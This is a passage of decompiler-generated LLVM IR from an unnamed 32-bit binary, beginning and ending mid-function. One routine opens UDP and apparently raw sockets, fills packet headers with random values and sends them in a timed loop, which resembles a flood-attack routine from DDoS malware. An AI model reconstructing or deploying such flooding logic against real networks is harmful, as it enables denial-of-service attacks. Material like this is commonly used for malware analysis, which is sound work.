  %v3_cbf4 = add i32 %v2_b264, 9
  %v4_cbf4 = inttoptr i32 %v3_cbf4 to i8*
  store i8 1, i8* %v4_cbf4, align 1
  br label %dec_label_pc_cfc0

bb41:                                             ; preds = %dec_label_pc_cb50
  store i32 %v3_b258, i32* %r2.global-to-local, align 4
  %v2_cc3c = load i32, i32* %v1_cb68, align 8
  store i32 %v2_cc3c, i32* @r4, align 4
  %v2_cc44 = load i32, i32* inttoptr (i32 144512 to i32*), align 128
  store i32 %v2_cc44, i32* @r5, align 4
  %v2_cc4c = load i32, i32* inttoptr (i32 144512 to i32*), align 128
  store i32 %v2_cc4c, i32* @r0, align 4
  %v0_cc54 = call i32 @function_11fd0()
  %v0_cc5c = load i32, i32* @r4, align 4
  %v0_cc60 = load i32, i32* @r5, align 4
  store i32 %v0_cc54, i32* %r2.global-to-local, align 4
  %v4_cc6c = call i32 @function_127fc(i32 %v0_cc5c, i32 %v0_cc60, i32 %v0_cc54, i32 16384)
  %v1_cc74 = icmp slt i32 %v4_cc6c, 0
  br i1 %v1_cc74, label %dec_label_pc_cc7c, label %dec_label_pc_ccd0

dec_label_pc_cc7c:                                ; preds = %bb41
  store i8 0, i8* %v1_b26c, align 8
  store i32 %v2_b268, i32* %r2.global-to-local, align 4
  %v3_ccc8 = add i32 %v2_b264, 9
  %v4_ccc8 = inttoptr i32 %v3_ccc8 to i8*
  store i8 1, i8* %v4_ccc8, align 1
  br label %dec_label_pc_cfc0

dec_label_pc_ccd0:                                ; preds = %bb41
  store i32 %v3_b258, i32* %r2.global-to-local, align 4
  %v2_cce8 = load i32, i32* %v1_cb68, align 8
  store i32 %v2_cce8, i32* @r4, align 4
  %v2_ccf0 = load i32, i32* inttoptr (i32 144504 to i32*), align 8
  store i32 %v2_ccf0, i32* @r5, align 4
  %v2_ccf8 = load i32, i32* inttoptr (i32 144504 to i32*), align 8
  store i32 %v2_ccf8, i32* @r0, align 4
  %v0_cd00 = call i32 @function_11fd0()
  %v0_cd08 = load i32, i32* @r4, align 4
  %v0_cd0c = load i32, i32* @r5, align 4
  store i32 %v0_cd00, i32* %r2.global-to-local, align 4
  %v4_cd18 = call i32 @function_127fc(i32 %v0_cd08, i32 %v0_cd0c, i32 %v0_cd00, i32 16384)
  %v1_cd20 = icmp slt i32 %v4_cd18, 0
  store i32 %v2_b268, i32* %r2.global-to-local, align 4
  br i1 %v1_cd20, label %dec_label_pc_cd28, label %dec_label_pc_cd7c

dec_label_pc_cd28:                                ; preds = %dec_label_pc_ccd0
  store i8 0, i8* %v1_b26c, align 8
  store i32 %v2_b268, i32* %r2.global-to-local, align 4
  %v3_cd74 = add i32 %v2_b264, 9
  %v4_cd74 = inttoptr i32 %v3_cd74 to i8*
  store i8 1, i8* %v4_cd74, align 1
  br label %dec_label_pc_cfc0

dec_label_pc_cd7c:                                ; preds = %dec_label_pc_ccd0
  store i8 8, i8* %v1_b26c, align 8
  br label %dec_label_pc_cfc0

dec_label_pc_cda8:                                ; preds = %dec_label_pc_b24c
  store i32 %v3_b258, i32* %r2.global-to-local, align 4
  %v2_cdc4 = add i32 %v2_b260, %v2_b720
  %v1_cdc8 = inttoptr i32 %v2_cdc4 to i32*
  %v2_cdc8 = load i32, i32* %v1_cdc8, align 4
  %v2_cdcc = icmp eq i32 %v2_cdc8, 0
  br i1 %v2_cdcc, label %dec_label_pc_cdd4, label %dec_label_pc_ce0c

dec_label_pc_cdd4:                                ; preds = %dec_label_pc_cda8
  store i32 %storemerge450, i32* @r4, align 4
  %v2_cddc = call i32 @function_1051c(i32* null)
  store i32 12, i32* %ip.global-to-local, align 4
  %v0_cdf0 = load i32, i32* @r4, align 4
  %v3_cdf4 = mul i32 %v0_cdf0, 8
  store i32 %v3_cdf4, i32* %r2.global-to-local, align 4
  %v2_cdfc = mul i32 %v0_cdf0, 24
  %v2_ce04 = add i32 %v2_b720, %v2_cdfc
  %v2_ce08 = inttoptr i32 %v2_ce04 to i32*
  store i32 %v2_cddc, i32* %v2_ce08, align 4
  br label %dec_label_pc_ce0c

dec_label_pc_ce0c:                                ; preds = %dec_label_pc_cda8, %dec_label_pc_cdd4
  store i32 %v3_b258, i32* %r2.global-to-local, align 4
  %v1_ce24 = inttoptr i32 %v2_b264 to i32*
  %v2_ce24 = load i32, i32* %v1_ce24, align 8
  store i32 %v2_ce24, i32* @r4, align 4
  %v2_ce2c = load i32, i32* inttoptr (i32 144508 to i32*), align 4
  store i32 %v2_ce2c, i32* @r5, align 4
  %v2_ce34 = load i32, i32* inttoptr (i32 144508 to i32*), align 4
  store i32 %v2_ce34, i32* @r0, align 4
  %v0_ce3c = call i32 @function_11fd0()
  %v0_ce44 = load i32, i32* @r4, align 4
  %v0_ce48 = load i32, i32* @r5, align 4
  store i32 %v0_ce3c, i32* %r2.global-to-local, align 4
  %v4_ce54 = call i32 @function_127fc(i32 %v0_ce44, i32 %v0_ce48, i32 %v0_ce3c, i32 16384)
  %v1_ce5c = icmp slt i32 %v4_ce54, 0
  br i1 %v1_ce5c, label %dec_label_pc_ce64, label %dec_label_pc_cf10

dec_label_pc_ce64:                                ; preds = %dec_label_pc_ce0c
  store i32 %v3_b258, i32* %r2.global-to-local, align 4
  %v2_ce7c = load i32, i32* %v1_ce24, align 8
  %v3_ce84 = call i32 @function_b04c(i32 %v2_ce7c, i32 %v3_b14c, i32 %v3_b258)
  store i8 0, i8* %v1_b26c, align 8
  %v3_ced4 = add i32 %v2_b264, 9
  %v4_ced4 = inttoptr i32 %v3_ced4 to i8*
  store i8 1, i8* %v4_ced4, align 1
  store i32 %v3_b258, i32* %r2.global-to-local, align 4
  %v2_cef4 = add i32 %v2_b260, %v2_b208
  %v1_cef8 = inttoptr i32 %v2_cef4 to i32*
  %v2_cef8 = load i32, i32* %v1_cef8, align 4
  store i32 1024, i32* @r2, align 4
  %v2_cf08 = inttoptr i32 %v2_cef8 to i8*
  %v3_cf08 = call i32 @function_11f30(i8* %v2_cf08, i32 0)
  br label %dec_label_pc_cfc0

dec_label_pc_cf10:                                ; preds = %dec_label_pc_ce0c
  store i32 %v3_b258, i32* %r2.global-to-local, align 4
  %v2_cf2c = add i32 %v2_b264, 12
  %v1_cf30 = inttoptr i32 %v2_cf2c to i32*
  %v2_cf30 = load i32, i32* %v1_cf30, align 4
  %v1_cf34 = add i32 %v2_cf30, 45
  store i32 %v1_cf34, i32* @r4, align 4
  %v2_cf3c = call i32 @function_1051c(i32* null)
  %v0_cf44 = load i32, i32* @r4, align 4
  %v3_cf44 = icmp ult i32 %v0_cf44, %v2_cf3c
  br i1 %v3_cf44, label %dec_label_pc_cf4c, label %dec_label_pc_cfc0

dec_label_pc_cf4c:                                ; preds = %dec_label_pc_cf10
  store i32 %v3_b258, i32* %r2.global-to-local, align 4
  %v2_cf64 = load i32, i32* %v1_ce24, align 8
  %v3_cf6c = call i32 @function_b04c(i32 %v2_cf64, i32 %v3_b14c, i32 %v3_b258)
  store i8 0, i8* %v1_b26c, align 8
  store i32 %v2_b268, i32* %r2.global-to-local, align 4
  %v3_cfbc = add i32 %v2_b264, 9
  %v4_cfbc = inttoptr i32 %v3_cfbc to i8*
  store i8 1, i8* %v4_cfbc, align 1
  br label %dec_label_pc_cfc0

dec_label_pc_cfc0:                                ; preds = %dec_label_pc_baf0, %dec_label_pc_bdbc, %dec_label_pc_c3a4, %dec_label_pc_ca3c, %dec_label_pc_cf10, %dec_label_pc_b24c, %dec_label_pc_b508, %dec_label_pc_ce64, %dec_label_pc_cd7c, %dec_label_pc_cd28, %dec_label_pc_cc7c, %dec_label_pc_cba8, %dec_label_pc_cad8, %dec_label_pc_c9dc, %dec_label_pc_c930, %dec_label_pc_c84c, %dec_label_pc_c68c, %dec_label_pc_c614, %dec_label_pc_c560, %dec_label_pc_c440, %dec_label_pc_c32c, %dec_label_pc_c1d8, %dec_label_pc_c0a4, %dec_label_pc_c02c, %dec_label_pc_bf78, %dec_label_pc_be58, %dec_label_pc_b960, %dec_label_pc_b6b4, %dec_label_pc_b664, %dec_label_pc_b4dc, %dec_label_pc_bd0c, %dec_label_pc_bb2c, %dec_label_pc_cf4c
  %v1_cfc4 = add nuw nsw i32 %storemerge450, 1
  store i32 %v1_cfc4, i32* %r2.global-to-local, align 4
  %v5_cfd8 = icmp slt i32 %v1_cfc4, %v0_b0e4
  br i1 %v5_cfd8, label %dec_label_pc_b24c, label %dec_label_pc_b240

; uselistorder directives
  uselistorder i32 %v1_cfc4, { 2, 1, 0 }
  uselistorder i32 %v0_ce3c, { 1, 0 }
  uselistorder i32* %v1_ce24, { 1, 0, 2 }
  uselistorder i32 %v0_cdf0, { 1, 0 }
  uselistorder i32 %v0_cd00, { 1, 0 }
  uselistorder i32 %v0_cc54, { 1, 0 }
  uselistorder i32 %v0_cb80, { 1, 0 }
  uselistorder i32 %v2_c918, { 1, 0 }
  uselistorder i32 %v0_c700, { 1, 0 }
  uselistorder i32 %v0_c538, { 1, 0 }
  uselistorder i32* %v1_c4d0, { 1, 0, 2 }
  uselistorder i32 %v0_c118, { 1, 0 }
  uselistorder i32 %v0_bf50, { 1, 0 }
  uselistorder i32* %v1_bee8, { 1, 0, 2 }
  uselistorder i32 %v0_bbec, { 1, 0 }
  uselistorder i32 %v2_b978, { 1, 0 }
  uselistorder i32* %v1_b7c0, { 2, 4, 0, 1, 3, 5, 6, 7 }
  uselistorder i32 %storemerge59, { 1, 0 }
  uselistorder i32 %v0_b750, { 1, 0 }
  uselistorder i8* %v2_b3d0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_b38c, { 1, 0 }
  uselistorder i32 %v2_b320, { 1, 0 }
  uselistorder i8* %v2_b2f4, { 1, 0, 2 }
  uselistorder i8* %v1_b26c, { 26, 25, 24, 23, 22, 21, 17, 19, 18, 20, 16, 15, 14, 12, 13, 0, 11, 10, 9, 6, 7, 8, 3, 5, 2, 4, 1, 27 }
  uselistorder i32 %v2_b268, { 25, 23, 24, 22, 21, 18, 19, 20, 17, 16, 15, 13, 14, 12, 11, 10, 7, 8, 9, 4, 6, 3, 5, 1, 0, 2, 26 }
  uselistorder i32 %v2_b264, { 46, 6, 45, 47, 43, 42, 41, 44, 35, 36, 5, 37, 38, 39, 40, 32, 31, 33, 34, 27, 28, 3, 29, 4, 30, 24, 23, 25, 26, 19, 20, 21, 22, 15, 17, 13, 14, 16, 18, 8, 9, 1, 0, 2, 10, 11, 12, 7 }
  uselistorder i32 %v3_b258, { 91, 92, 90, 89, 87, 88, 86, 85, 84, 83, 82, 72, 73, 71, 70, 79, 77, 78, 76, 80, 81, 75, 74, 69, 68, 67, 66, 64, 65, 62, 63, 61, 60, 59, 53, 54, 52, 51, 55, 56, 50, 58, 57, 49, 48, 47, 46, 44, 45, 42, 43, 41, 40, 39, 36, 37, 35, 34, 38, 33, 32, 31, 30, 29, 25, 26, 24, 27, 28, 23, 22, 20, 21, 19, 18, 17, 16, 15, 12, 13, 11, 10, 9, 8, 7, 6, 5, 4, 3, 14, 2, 1, 0 }
  uselistorder i32 %storemerge450, { 4, 6, 2, 7, 1, 8, 0, 9, 10, 11, 12, 5, 3 }
  uselistorder i32 %v2_bcc0, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v2_b76c, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v2_b720, { 0, 5, 1, 6, 2, 7, 3, 8, 4, 9 }
  uselistorder i32 %v1_b228, { 2, 1, 0 }
  uselistorder i32 %storemerge359, { 3, 2, 1, 0 }
  uselistorder i32 %v2_b208, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 %v3_b14c, { 5, 4, 6, 7, 8, 10, 9, 11, 12, 14, 13, 15, 17, 18, 16, 21, 0, 20, 19, 1, 22, 2, 23, 24, 3, 25, 26 }
  uselistorder i32 %v0_b0e4, { 4, 3, 0, 1, 2 }
  uselistorder i32 %v3_b0c0, { 1, 0 }
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-212, { 0, 2, 1 }
  uselistorder i32* %stack_var_-196, { 1, 0, 2, 3 }
  uselistorder i32* %r2.global-to-local, { 129, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28, 29, 27, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 83, 84, 85, 86, 87, 88, 90, 89, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 135, 132, 130, 131, 136, 133, 134 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 20, 21, 22, 23, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder [9 x i8]* @global_var_19e98.71, { 1, 0 }
  uselistorder i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_19e98.71, i32 0, i32 0), { 1, 0 }
  uselistorder i8 7, { 1, 0 }
  uselistorder i32 ptrtoint ([3 x i8]* @global_var_19e88.67 to i32), { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_a5b0, { 2, 1, 0 }
  uselistorder i32 10000, { 2, 1, 0 }
  uselistorder i32 (i32)* @function_a43c, { 2, 0, 1 }
  uselistorder i32 (i32, i32, i32)* @function_b04c, { 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 0, 3, 2, 1 }
  uselistorder i8 3, { 1, 0, 2 }
  uselistorder i32 -156, { 1, 0 }
  uselistorder label %dec_label_pc_cfc0, { 32, 4, 7, 8, 9, 10, 11, 12, 3, 13, 14, 15, 16, 17, 18, 19, 2, 20, 21, 22, 23, 24, 25, 1, 30, 31, 0, 26, 27, 28, 6, 29, 5 }
  uselistorder label %dec_label_pc_ce0c, { 1, 0 }
  uselistorder label %dec_label_pc_c71c, { 1, 0 }
  uselistorder label %dec_label_pc_c134, { 1, 0 }
  uselistorder label %dec_label_pc_bc68, { 1, 0 }
  uselistorder label %dec_label_pc_bc08, { 1, 0 }
  uselistorder label %dec_label_pc_baf0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_b780, { 1, 0 }
  uselistorder label %dec_label_pc_b6b4, { 1, 0 }
  uselistorder label %dec_label_pc_b4b0, { 1, 0 }
  uselistorder label %dec_label_pc_b24c, { 1, 0 }
  uselistorder label %dec_label_pc_b240, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b190, { 1, 0 }
  uselistorder label %bb39, { 1, 0 }
  uselistorder label %bb37, { 1, 0 }
}

define i32 @function_cfe0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_cfe0:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  store i32 53228, i32* %stack_var_-4, align 4
  %v2_cfe8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_cfe8, i32* @fp, align 4
  store i32 2, i32* %stack_var_-80, align 4
  %v2_d00c = icmp eq i32 %arg2, 0
  br i1 %v2_d00c, label %dec_label_pc_d014, label %dec_label_pc_d02c

dec_label_pc_d014:                                ; preds = %dec_label_pc_cfe0
  %v0_d014 = call i32 @function_8440()
  br label %dec_label_pc_d048

dec_label_pc_d02c:                                ; preds = %dec_label_pc_cfe0
  %v3_d034 = urem i32 %arg2, 65536
  %v1_d03c = call i32 @function_125e0(i32 %v3_d034)
  br label %dec_label_pc_d048

dec_label_pc_d048:                                ; preds = %dec_label_pc_d014, %dec_label_pc_d02c
  %v3_d058 = call i32 @function_96fc(i32 %arg1, i32* nonnull %stack_var_-76)
  %v2_d060 = icmp eq i32 %v3_d058, 0
  br i1 %v2_d060, label %dec_label_pc_d068, label %dec_label_pc_d568

dec_label_pc_d068:                                ; preds = %dec_label_pc_d048
  store i32 8, i32* @r2, align 4
  %v2_d07c = bitcast i32* %stack_var_-72 to i8*
  %v3_d07c = call i32 @function_11f30(i8* %v2_d07c, i32 0)
  store i32 %arg6, i32* %r2.global-to-local, align 4
  %v7_d08c = icmp eq i32 %arg4, 32
  br i1 %v7_d08c, label %dec_label_pc_d094, label %dec_label_pc_d1ac

dec_label_pc_d094:                                ; preds = %dec_label_pc_d068
  store i32 17, i32* %r2.global-to-local, align 4
  %v3_d0a0 = call i32 @function_128b8(i32 2, i32 2, i32 17)
  %v2_d0b0 = icmp eq i32 %v3_d0a0, 0
  br i1 %v2_d0b0, label %dec_label_pc_d568, label %dec_label_pc_d0b8

dec_label_pc_d0b8:                                ; preds = %dec_label_pc_d094
  %v3_d0b8 = load i32, i32* %stack_var_0, align 4
  %v1_d0bc = add i32 %v3_d0b8, 1
  %v1_d0c4 = call i32 @function_12b00(i32 %v1_d0bc)
  %v2_d0d4 = icmp eq i32 %v1_d0c4, 0
  br i1 %v2_d0d4, label %dec_label_pc_d568, label %dec_label_pc_d0dc

dec_label_pc_d0dc:                                ; preds = %dec_label_pc_d0b8
  %v3_d0dc = load i32, i32* %stack_var_0, align 4
  %v1_d0e0 = add i32 %v3_d0dc, 1
  store i32 %v1_d0e0, i32* @r2, align 4
  %v2_d0f0 = inttoptr i32 %v1_d0c4 to i8*
  %v3_d0f0 = call i32 @function_11f30(i8* %v2_d0f0, i32 0)
  %v2_d0fc = call i32 @function_9ae8(i32 %v1_d0c4, i32 %v3_d0dc)
  %v2_d104 = call i32 @function_1051c(i32* null)
  store i32 %v2_d104, i32* %r2.global-to-local, align 4
  %v2_d110 = add i32 %v2_d104, %arg3
  %v2_d124 = ptrtoint i32* %stack_var_-80 to i32
  br label %dec_label_pc_d120

dec_label_pc_d120:                                ; preds = %dec_label_pc_d19c, %dec_label_pc_d190, %dec_label_pc_d0dc
  %stack_var_-112.0 = phi i32 [ 0, %dec_label_pc_d0dc ], [ 0, %dec_label_pc_d190 ], [ %v1_d1a0, %dec_label_pc_d19c ]
  %v3_d120 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_d120, i32* %r2.global-to-local, align 4
  %v6_d144 = call i32 @function_12834(i32 %v3_d0a0, i32 %v1_d0c4, i32 %v3_d120, i32 0, i32 %v2_d124, i32 16)
  store i32 %stack_var_-112.0, i32* %r2.global-to-local, align 4
  %v9_d150 = icmp eq i32 %stack_var_-112.0, %arg6
  br i1 %v9_d150, label %dec_label_pc_d158, label %dec_label_pc_d19c

dec_label_pc_d158:                                ; preds = %dec_label_pc_d120
  br i1 %v2_d00c, label %dec_label_pc_d164, label %dec_label_pc_d178

dec_label_pc_d164:                                ; preds = %dec_label_pc_d158
  %v0_d164 = call i32 @function_8440()
  br label %dec_label_pc_d178

dec_label_pc_d178:                                ; preds = %dec_label_pc_d158, %dec_label_pc_d164
  %v2_d17c = call i32 @function_1051c(i32* null)
  store i32 %v2_d17c, i32* %r2.global-to-local, align 4
  %v8_d18c = icmp sgt i32 %v2_d17c, %v2_d110
  br i1 %v8_d18c, label %dec_label_pc_d568, label %dec_label_pc_d190

dec_label_pc_d190:                                ; preds = %dec_label_pc_d178
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_d120

dec_label_pc_d19c:                                ; preds = %dec_label_pc_d120
  %v1_d1a0 = add i32 %stack_var_-112.0, 1
  br label %dec_label_pc_d120

dec_label_pc_d1ac:                                ; preds = %dec_label_pc_d068
  store i32 17, i32* %r2.global-to-local, align 4
  %v3_d1c0 = call i32 @function_128b8(i32 2, i32 3, i32 17)
  %v2_d1d0 = icmp eq i32 %v3_d1c0, 0
  br i1 %v2_d1d0, label %dec_label_pc_d564, label %dec_label_pc_d1dc

dec_label_pc_d1dc:                                ; preds = %dec_label_pc_d1ac
  store i32 1, i32* %stack_var_-84, align 4
  %v2_d1e4 = ptrtoint i32* %stack_var_-84 to i32
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_d200 = call i32 @function_12874(i32 %v3_d1c0, i32 0, i32 3, i32 %v2_d1e4, i32 4)
  %v1_d208 = icmp slt i32 %v5_d200, 0
  br i1 %v1_d208, label %dec_label_pc_d564, label %dec_label_pc_d214

dec_label_pc_d214:                                ; preds = %dec_label_pc_d1dc
  br label %dec_label_pc_d220

dec_label_pc_d220:                                ; preds = %dec_label_pc_d214, %dec_label_pc_d220
  %v1_d25821 = phi i32 [ 49, %dec_label_pc_d214 ], [ %v1_d258, %dec_label_pc_d220 ]
  %v2_d224 = call i32 @function_1051c(i32* null)
  store i32 %v2_d224, i32* @r4, align 4
  %v0_d230 = call i32 @function_8440()
  %v0_d238 = load i32, i32* @r4, align 4
  %v2_d238 = xor i32 %v0_d238, %v0_d230
  %v1_d240 = call i32 @function_13c5c(i32 %v2_d238)
  %v0_d244 = call i32 @function_13a28()
  %v1_d250 = call i32 @function_8368(i32 %v0_d244)
  %v1_d258 = add nsw i32 %v1_d25821, -1
  %v3_d264 = icmp eq i32 %v1_d25821, 0
  br i1 %v3_d264, label %dec_label_pc_d26c, label %dec_label_pc_d220

dec_label_pc_d26c:                                ; preds = %dec_label_pc_d220
  %v2_d270 = icmp eq i32 %arg4, 0
  br i1 %v2_d270, label %dec_label_pc_d29c, label %dec_label_pc_d284

dec_label_pc_d284:                                ; preds = %dec_label_pc_d26c
  %v1_d288 = sub i32 32, %arg4
  store i32 %v1_d288, i32* %r2.global-to-local, align 4
  %v1_d294 = shl i32 -1, %v1_d288
  br label %dec_label_pc_d29c

dec_label_pc_d29c:                                ; preds = %dec_label_pc_d26c, %dec_label_pc_d284
  %storemerge10 = phi i32 [ %v1_d294, %dec_label_pc_d284 ], [ 0, %dec_label_pc_d26c ]
  %v3_d29c = load i32, i32* %stack_var_0, align 4
  %v1_d2a0 = add i32 %v3_d29c, 28
  %v1_d2b0 = add i32 %v3_d29c, 42
  %v3_d2b4 = and i32 %v1_d2b0, -8
  %v1_d2bc = load i32, i32* @sp, align 4
  %v2_d2bc = sub i32 %v1_d2bc, %v3_d2b4
  %v1_d2c0 = add i32 %v2_d2bc, 8
  store i32 %v1_d2c0, i32* %r2.global-to-local, align 4
  %v1_d2cc = add i32 %v2_d2bc, 15
  %v3_d2d0 = and i32 %v1_d2cc, -8
  %v1_d2f0 = add i32 %v3_d2d0, 20
  %v5_d2f4 = inttoptr i32 %v1_d2f0 to i16*
  %v3_d2f8 = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_d2f8, i32* @r4, align 4
  %v1_d300 = call i32 @function_acc0(i32 %storemerge10)
  %v1_d30c = call i32 @function_125f0(i32 %v1_d300)
  store i32 %v1_d30c, i32* %r2.global-to-local, align 4
  %v3_d314 = load i32, i32* %stack_var_0, align 4
  %v1_d318 = add i32 %v3_d314, 8
  %v1_d31c = load i32, i32* @sp, align 4
  %v2_d31c = inttoptr i32 %v1_d31c to i32*
  store i32 %v1_d318, i32* %v2_d31c, align 4
  %v0_d324 = load i32, i32* @r4, align 4
  %v4_d32c = inttoptr i32 %v3_d2d0 to i8*
  %v5_d32c = call i32 @function_af4c(i8* %v4_d32c, i32 %v0_d324, i32 %v1_d30c, i32 17)
  %v3_d330 = load i32, i32* %stack_var_0, align 4
  %fold = add i32 %v3_d330, 8
  %v3_d344 = urem i32 %fold, 65536
  %v1_d34c = call i32 @function_125e0(i32 %v3_d344)
  %sext = mul i32 %v1_d34c, 65536
  %v1_d350 = sdiv i32 %sext, 65536
  store i32 %v1_d350, i32* %r2.global-to-local, align 4
  %v1_d35c = trunc i32 %v1_d350 to i16
  %v3_d35c = add i32 %v3_d2d0, 24
  %v4_d35c = inttoptr i32 %v3_d35c to i16*
  store i16 %v1_d35c, i16* %v4_d35c, align 8
  %v0_d360 = call i32 @function_8440()
  %v3_d36c = urem i32 %v0_d360, 65536
  store i32 %v3_d36c, i32* %r2.global-to-local, align 4
  %v1_d374 = trunc i32 %v0_d360 to i16
  store i16 %v1_d374, i16* %v5_d2f4, align 4
  br i1 %v2_d00c, label %dec_label_pc_d384, label %dec_label_pc_d39c

dec_label_pc_d384:                                ; preds = %dec_label_pc_d29c
  %v0_d384 = call i32 @function_8440()
  %extract.t = trunc i32 %v0_d384 to i16
  br label %dec_label_pc_d3b8

dec_label_pc_d39c:                                ; preds = %dec_label_pc_d29c
  %v3_d3a4 = urem i32 %arg2, 65536
  %v1_d3ac = call i32 @function_125e0(i32 %v3_d3a4)
  %extract.t79 = trunc i32 %v1_d3ac to i16
  br label %dec_label_pc_d3b8

dec_label_pc_d3b8:                                ; preds = %dec_label_pc_d384, %dec_label_pc_d39c
  %v0_d384.sink.off0 = phi i16 [ %extract.t, %dec_label_pc_d384 ], [ %extract.t79, %dec_label_pc_d39c ]
  %v3_d49c.pre-phi = phi i32 [ 0, %dec_label_pc_d384 ], [ %v3_d3a4, %dec_label_pc_d39c ]
  %v3_d3c0 = add i32 %v3_d2d0, 22
  %v4_d3c0 = inttoptr i32 %v3_d3c0 to i16*
  store i16 %v0_d384.sink.off0, i16* %v4_d3c0, align 2
  store i32 %v1_d2f0, i32* %r2.global-to-local, align 4
  %v3_d3cc = add i32 %v3_d2d0, 26
  %v4_d3cc = inttoptr i32 %v3_d3cc to i16*
  store i16 0, i16* %v4_d3cc, align 2
  %v1_d3d4 = add i32 %v3_d2d0, 28
  %v3_d3dc = load i32, i32* %stack_var_0, align 4
  %v2_d3e0 = call i32 @function_9ae8(i32 %v1_d3d4, i32 %v3_d3dc)
  store i32 %v3_d2d0, i32* %r2.global-to-local, align 4
  %v1_d3f0 = or i32 %v3_d2d0, 2
  %v2_d3f0 = inttoptr i32 %v1_d3f0 to i16*
  %v3_d3f0 = load i16, i16* %v2_d3f0, align 2
  %v4_d3f0 = zext i16 %v3_d3f0 to i32
  %v2_d3fc = inttoptr i32 %v3_d2d0 to i16*
  %v3_d3fc = call i32 @function_ad24(i16* %v2_d3fc, i32 %v4_d3f0)
  %sext4 = mul i32 %v3_d3fc, 65536
  %v1_d400 = sdiv i32 %sext4, 65536
  store i32 %v1_d400, i32* %r2.global-to-local, align 4
  %v1_d40c = trunc i32 %v1_d400 to i16
  %v3_d40c = add i32 %v3_d2d0, 10
  %v4_d40c = inttoptr i32 %v3_d40c to i16*
  store i16 %v1_d40c, i16* %v4_d40c, align 2
  %v2_d414 = call i32 @function_1051c(i32* null)
  store i32 %v2_d414, i32* %r2.global-to-local, align 4
  %v2_d420 = add i32 %v2_d414, %arg3
  %v2_d434 = ptrtoint i32* %stack_var_-80 to i32
  %v3_d4d0 = or i32 %v3_d2d0, 4
  %v4_d4d0 = inttoptr i32 %v3_d4d0 to i16*
  %v2_d4f0 = add i32 %v3_d2d0, 12
  %v3_d4f0 = inttoptr i32 %v2_d4f0 to i32*
  br label %dec_label_pc_d430

dec_label_pc_d430:                                ; preds = %dec_label_pc_d554, %dec_label_pc_d548, %dec_label_pc_d3b8
  %stack_var_-108.0 = phi i32 [ 0, %dec_label_pc_d3b8 ], [ 0, %dec_label_pc_d548 ], [ %v1_d558, %dec_label_pc_d554 ]
  store i32 %v3_d2d0, i32* %r2.global-to-local, align 4
  %v1_d438 = load i32, i32* @sp, align 4
  %v2_d438 = inttoptr i32 %v1_d438 to i32*
  store i32 %v2_d434, i32* %v2_d438, align 4
  %v1_d440 = load i32, i32* @sp, align 4
  %v2_d440 = add i32 %v1_d440, 4
  %v3_d440 = inttoptr i32 %v2_d440 to i32*
  store i32 16, i32* %v3_d440, align 4
  %v0_d448 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_d2a0, i32* %r2.global-to-local, align 4
  %v6_d454 = call i32 @function_12834(i32 %v3_d1c0, i32 %v0_d448, i32 %v1_d2a0, i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_d458 = call i32 @function_8440()
  %v3_d464 = urem i32 %v0_d458, 65536
  store i32 %v3_d464, i32* %r2.global-to-local, align 4
  %v1_d46c = trunc i32 %v0_d458 to i16
  store i16 %v1_d46c, i16* %v5_d2f4, align 4
  br i1 %v2_d00c, label %dec_label_pc_d47c, label %dec_label_pc_d494

dec_label_pc_d47c:                                ; preds = %dec_label_pc_d430
  %v0_d47c = call i32 @function_8440()
  %extract.t80 = trunc i32 %v0_d47c to i16
  br label %dec_label_pc_d4b0

dec_label_pc_d494:                                ; preds = %dec_label_pc_d430
  %v1_d4a4 = call i32 @function_125e0(i32 %v3_d49c.pre-phi)
  %extract.t81 = trunc i32 %v1_d4a4 to i16
  br label %dec_label_pc_d4b0

dec_label_pc_d4b0:                                ; preds = %dec_label_pc_d47c, %dec_label_pc_d494
  %v0_d47c.sink.off0 = phi i16 [ %extract.t80, %dec_label_pc_d47c ], [ %extract.t81, %dec_label_pc_d494 ]
  %v4_d4b4 = sext i16 %v0_d47c.sink.off0 to i32
  store i32 %v4_d4b4, i32* %r2.global-to-local, align 4
  store i16 %v0_d47c.sink.off0, i16* %v4_d3c0, align 2
  %v0_d4bc = call i32 @function_8440()
  %v3_d4c8 = urem i32 %v0_d4bc, 65536
